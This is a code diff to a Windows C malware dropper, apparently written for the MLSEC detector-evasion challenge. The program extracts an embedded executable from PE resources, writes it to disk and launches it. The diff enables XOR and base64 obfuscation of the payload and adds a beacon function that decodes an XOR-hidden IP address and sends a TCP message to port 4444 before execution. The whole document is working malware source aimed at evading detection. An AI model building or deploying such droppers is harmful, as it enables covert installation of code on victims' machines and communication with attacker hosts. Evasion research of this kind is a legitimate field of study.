@@ -1,3 +1,10 @@
+#define _CRT_SECURE_NO_WARNINGS
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+// the above prevent warnings
+// for socket
+#include <winsock2.h>
+#pragma comment(lib, "Ws2_32.lib")
+
 // Drops and executes an Executable Binary from the PE Resources
 // Created By Marcus Botacin for the MLSEC challenge
 // Changelog: Created in 2019, updated in 2020 with obfuscation tricks
@@ -32,15 +39,51 @@ void set_name();
 
 // Dropper Configurations
 #define DEAD_IMPORTS
-//#define XOR_ENCODE
+#define XOR_ENCODE
 #define XOR_KEY 0x73
-//#define BASE64
+#define BASE64	
 #define RANDOM_NAME
 #define NAME_SIZE 10
 #define INJECT
+// Socket
+#define IP_XOR_KEY 0x41
+#define ENCODED_IP {0x70, 0x78, 0x73, 0x6f, 0x70, 0x77, 0x79, 0x6f, 0x74, 0x77, 0x6f, 0x70}
+#define ENCODED_IP_LEN 12
+#define SERVER_PORT 4444
 
 // global: final binary name
 char name[10*NAME_SIZE];
+
+// notify to host tcp
+void notify()
+{
+	WSADATA wsa;
+	WSAStartup(MAKEWORD(2, 2), &wsa);
+
+	SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
+
+	// Decode IP at runtime
+	unsigned char encoded_ip[] = ENCODED_IP;
+	char decoded_ip[ENCODED_IP_LEN + 1];
+	for (int i = 0; i < ENCODED_IP_LEN; i++) {
+		decoded_ip[i] = encoded_ip[i] ^ IP_XOR_KEY;
+	}
+	decoded_ip[ENCODED_IP_LEN] = '\0';
+
+	struct sockaddr_in server;
+	server.sin_family = AF_INET;
+	server.sin_port = htons(SERVER_PORT);
+	server.sin_addr.s_addr = inet_addr(decoded_ip);
+
+	connect(s, (struct sockaddr*)&server, sizeof(server));
+
+	const char* msg = "Dropper will execute";
+	send(s, msg, strlen(msg), 0);
+
+	closesocket(s);
+	WSACleanup();
+}
+
 
 // Entry Point
 int main()
@@ -55,18 +98,21 @@ int main()
 	void* data = LockResource(rc);
 	// Get embedded file size
 	DWORD size = SizeofResource(h,r);
-	// Obfuscation Procedures start here
-#ifdef XOR_ENCODE
-	data = XOR(data,size);
-#endif
+// Obfuscation Procedures start here
+// The order of decoding was switched here for testing
+// Used to be xor then b64, now it is b64 then xor
 #ifdef BASE64
-	data = base64decode(data,&size);
+	data = base64decode(data, &size);
+#endif
+#ifdef XOR_ENCODE
+	data = XOR(data, size);
 #endif
 	// where to drop
 	set_name();
 	// Drop to Disk
 	drop(size, data);
-	// launch process
+	// notify tcp and launch process
+	notify();
 	launch();
 #ifdef DEAD_CODE
 	// dead code
@@ -123,7 +169,7 @@ void launch()
 void* base64decode(void *data,DWORD *size)
 {
 	// original string size
-	int original_size = strlen((char*)data);
+	int original_size = (int)*size;
 	// number of bytes after decoded
 	int decoded_size = Base64DecodeGetRequiredLength(original_size);
 	// temporary buffer to store the decoded bytes
